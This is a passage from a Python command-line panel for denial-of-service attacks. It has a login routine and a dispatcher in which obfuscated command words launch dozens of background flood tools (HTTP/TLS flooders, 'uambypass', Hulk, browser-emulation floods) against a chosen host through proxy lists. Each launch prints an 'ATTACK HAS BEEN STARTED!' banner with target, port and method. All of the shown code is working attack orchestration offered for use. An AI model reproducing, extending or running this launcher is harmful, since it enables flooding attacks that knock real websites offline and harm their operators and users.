				os.system(f'cd .SUDAN && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
				os.system(f'cd .SUDANC && screen -dm node OVER6.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd /media && screen -dm node OVER.js {host} 32 {time}')
				os.system(f'cd /media && screen -dm node OVER2.js {host} {time} 10 proxy.txt 32 10')
				os.system(f'cd /media && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
				os.system(f'cd /media && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 32')
				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mMIX \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ ebejejeieiei \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()			    
		elif sinput == "ejrnrnrnroro" or sinput == "jrrjjrrnrnn":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
				os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')	
				os.system(f'cd /media && screen -dm node OVER.js {host} 16 {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mBOT2 \033[35m]
\033[1;37m                LAYER-12 : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ jrjrrjrjrj \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()			    
		elif sinput == "jejeieidndnd" or sinput == "ejejejejenrn":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .BF && screen -dm ./BROWSER {host} {time} 64 10')
				os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
				os.system(f'cd .BF && screen -dm node BROWSER3.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd .BF2 && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd .BF3 && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd .BF3 && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 3 500')	
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 5 500')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd /media && screen -dm ./BROWSER {host} {time} 64 10')
				os.system(f'cd /media && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
				os.system(f'cd /media && screen -dm node BROWSER3.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd /media && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd /media && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd /media && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')	
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mBROWSER \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mn4nrnrn \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "rnrjrirjrb" or sinput == "jrjrjrrnriiddb":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
				os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
				os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
				os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
				os.system(f'cd .randomstring && cd examples && screen -dm java input2.java {host} 8000')
				os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
				os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 64 3 500')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
				os.system(f'cd /media && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 64 1')
				os.system(f'cd /media && screen -dm node HTTP.js {host} 500 5 {time}')
				os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[1;37mKILLNET \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ rn\033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()			    			    
		elif sinput == "rnnrrkrk" or sinput == "enrnrkrk":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
				os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7   : \033[35m[ \033[1;37mUAM \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ rjrjrj \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
                

		
					
 

def load_credentials(filename="users.json"):
    try:
        with open(filename, 'r') as file:
            credentials = json.load(file)
        return credentials["user"], credentials["passwd"]
    except FileNotFoundError:
        print("Credentials file not found.")
        sys.exit(1)
    except KeyError:
        print("Invalid credentials file format.")
        sys.exit(1)

def login():
    os.system("clear")
    user, passwd = load_credentials()
    username = input("""






                           \33[0;36mUSERNAME : """)
    password = getpass.getpass(prompt="""
                           \33[0;36mPASSWORDS : """)
    if username != user or password != passwd:
        print("")
        print(f"""
                              \033[1;31;40mtolol""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""
                         \33[0;32mWELLCOME TO RYOTA""")
        time.sleep(0.3)
    menu()
    main()

login()
